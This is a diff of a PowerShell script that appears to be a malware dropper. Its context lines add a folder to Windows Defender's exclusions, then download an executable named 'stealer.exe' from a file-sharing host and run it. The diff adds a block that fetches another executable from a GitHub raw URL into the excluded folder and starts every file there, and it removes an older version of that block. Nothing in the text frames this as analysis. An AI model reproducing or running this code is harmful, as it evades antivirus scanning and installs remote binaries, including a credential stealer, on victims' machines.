@@ -23,6 +23,15 @@ New-Item -ItemType Directory -Path $temp
 Add-MpPreference -ExclusionPath $dir
 
 
+
+
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/goood.exe" -OutFile "$dir\remote.exe"
+
+Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
+    Write-Output $_.FullName
+    Start-Process -FilePath $_.FullName
+}
+
 $file = "$temp\runfirst1.txt"
 
 if (-not (Test-Path $file)) {
@@ -31,11 +40,4 @@ if (-not (Test-Path $file)) {
     
     Invoke-WebRequest -Uri "https://anonsharing.com/file/8f56ab5e1816f025/stealera.exe" -OutFile "$temp\stealer.exe"
     Start-Process -FilePath "$temp\stealer.exe"
-}
-
-Invoke-WebRequest -Uri "https://anonsharing.com/file/6e0dbbd45c92064d/yamte.exe" -OutFile "$dir\remote.exe"
-
-Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
-    Write-Output $_.FullName
-    Start-Process -FilePath $_.FullName
 }
